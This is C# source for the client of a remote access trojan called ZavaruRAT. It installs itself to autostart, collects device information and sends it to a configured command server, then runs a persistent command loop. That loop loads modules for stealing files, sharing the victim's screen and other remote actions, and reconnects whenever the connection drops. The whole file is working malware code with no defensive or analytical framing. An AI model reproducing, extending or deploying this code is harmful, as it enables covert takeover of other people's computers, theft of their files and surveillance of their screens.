﻿#region

using System.Diagnostics;
using System.Net.Sockets;
using ZavaruRAT.Client;
using ZavaruRAT.Client.Modules;
using ZavaruRAT.Client.Sdk;
using ZavaruRAT.Shared;
using ZavaruRAT.Shared.Models.Client;

#endregion

Utilities.EnsureOneInstance();

var autoStart = Installation.AddAutoStart();

DeviceInfo osInfo;
try
{
    osInfo = Utilities.GatherDeviceInfo();
}
catch (Exception e)
{
    Debug.WriteLine("Error while gathering device info");
    Debug.WriteLine(e);

    osInfo = DeviceInfo.Empty;
}

osInfo.AutoStart = autoStart;

async Task<ZavaruClient> ConnectUntilSuccessAsync()
{
    Debug.WriteLine("Connecting to the node");

    ZavaruClient? client;

    var repeatTime = TimeSpan.FromSeconds(2);
    while (true)
    {
        try
        {
            client = await ZavaruClient.CreateAsync(Config.IP, Config.Port);
            await client.SendAsync(osInfo);

            break;
        }
        catch (SocketException e)
        {
            Debug.WriteLine("Unable to connect");
            Debug.WriteLine(e);
        }

        if ((int)repeatTime.TotalSeconds != 16)
        {
            repeatTime *= 2;
            Debug.WriteLine("Repeat time: {0}", repeatTime);
        }

        await Task.Delay(repeatTime);
    }

    return client;
}

var commandExecutor = new CommandExecutor()
                      .AddModule<ExampleModule>()
                      .AddModule<FileStealerModule>()
                      .AddModule<EmergencyModule>()
                      .AddModule<ScreenShareModule>()
                      .AddModule<FunModule>();

var client = await ConnectUntilSuccessAsync();
while (true)
{
    Debug.WriteLine("Waiting for command...");

    Command? command = null;
    try
    {
        command = await client.ReceiveAsync<Command>();
    }
    catch (Exception e)
    {
        Debug.WriteLine("Error while receiving command");
        Debug.WriteLine(e);
    }

    Debug.WriteLine(command);

    if (command == null)
    {
        if (!client.Connected)
        {
            Debug.WriteLine("Disconnected!");

            client = await ConnectUntilSuccessAsync();
        }

        continue;
    }

    var isRealTime = commandExecutor.IsRealTime(command);

    if (isRealTime)
    {
        await client.SendAsync(new CommandResult
        {
            Status = CommandResultStatus.RealTime
        });
    }

    var result = await commandExecutor.ExecuteAsync(command, client);
    Debug.WriteLine(result);

    await client.SendAsync(result);
    Debug.WriteLine("Loop done!");
}
